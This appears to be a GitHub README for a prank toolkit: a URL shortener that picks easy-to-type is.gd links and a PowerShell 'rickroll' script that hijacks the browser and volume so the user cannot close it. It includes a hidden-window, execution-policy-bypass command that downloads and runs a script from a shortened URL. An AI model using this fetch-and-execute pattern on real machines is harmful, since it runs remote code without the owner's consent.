**Disclaimer**
> This project shall be used for **educational purposes only** \
> I (the author) take no responsibility or liability related to its usage.
> Any illegal activities are strictly forbidden.


## Tools

#### Urlshortener
Shortens an url with only "safe" characters for the domain [is.gd](https://is.gd)

<details>
<summary>Details</summary>

file: [urlshortener.py](urlshortener.py) \
Characters considered "safe" for keyboards are:
```
    t uiop
asdfghjkl
 xcvbnm
```
[![img.png](assets/keyboard_layouts.png)](https://www.quora.com/What-are-the-most-common-keyboard-layouts-And-why-is-each-layout-designed-as-such)
(from [quora](https://www.quora.com/What-are-the-most-common-keyboard-layouts-And-why-is-each-layout-designed-as-such))

### requirements
```shell
pip install --upgrade aiohttp
```

### usage
```shell
python urlshortener.py 
# https://is.gd/tuion
```
or
```python
import asyncio
from urlshortener import create_short

async def main():
    url = "https://kaliiiiiiiiii.github.io/rickroll"
    _range = range(5, 10) # range to find urls for
    shorturl = await create_short(url, _range)
    print(shorturl)

if __name__ == "__main__":
    asyncio.run(main())
```

</details>

#### Rickroll (powershell)
- opens MS Edge on url
- sets audio volume to max
- user can't close it
- exits after `n` seconds

<details>
<summary>Details</summary>

file: [rickroll.ps1](rickroll.ps1)

### usage
```shell
powershell -w h -ep ByPass "IEX(iwr('is.gd/tuipo'))"
```
(download from this repo) \
or
```shell
powershell ./rickroll.ps1
```

### configuration
You can change the `url` and `timeout` at [L96-L98](rickroll.ps1#L96-L98)

To create a short direct url to the file, run (replace `YourUserName` accordingly)
```shell
python urlshortener.py "https://raw.githubusercontent.com/YourUserName/PublicDuckyChallenger/master/rickroll.ps1"
```

</details>